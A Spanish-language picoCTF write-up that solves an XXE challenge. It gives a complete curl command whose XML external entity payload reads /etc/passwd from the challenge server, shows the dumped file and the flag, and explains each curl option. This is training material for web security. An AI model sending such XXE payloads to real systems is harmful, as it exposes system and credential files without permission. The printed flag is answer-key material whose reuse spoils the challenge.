### Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Hint: XML external entity Injection
### Solución
En la terminal usar el comando curl:
```
~ via 🐍 v3.13.5 
❯ curl -X POST http://saturn.picoctf.net:53835/data -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data><ID>&xxe;</ID></data>'
```
Y al final de la salida estara la flag.
**Flag**: picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}

### Solución 2
En burp suite por medio de foxyproxy obtenemos las peticiones data
Lo mandamos al repeater, ahi lo editamos y cambiamos el id y la ruta etc/passwd:

```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Mon, 21 Sep 2026 16:48:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}

```
### Notas Adicionales
**SOAP**: Simple Object Access Protocol. Es un protocolo de mensajería basado en XML que permite intercambiar información entre aplicaciones distribuidas.
- **`curl`**: Es el programa que ejecuta la acción (significa "Client URL").
    
- **`-X POST`**: Le indica al servidor que queremos hacer una petición de tipo `POST` (que se usa para enviar información), en lugar del `GET` tradicional que usan los navegadores para simplemente ver una página.
    
- **`[http://saturn.picoctf.net](http://saturn.picoctf.net):PUERTO/data`**: Es la dirección exacta (URL) a la que estamos atacando.
    
- **`-H "Content-Type: application/xml"`**: La `-H` significa _Header_ (cabecera). Aquí le estamos avisando al servidor: "Ojo la información que te voy a enviar está en formato XML". Si no ponemos esto, el servidor podría rechazar los datos.
    
- **`-d '...'`**: La `-d` significa _Data_. Todo el texto que va después entre comillas simples (`' '`) es el cuerpo de la petición
### Referencias
https://portswigger.net/web-security/xxe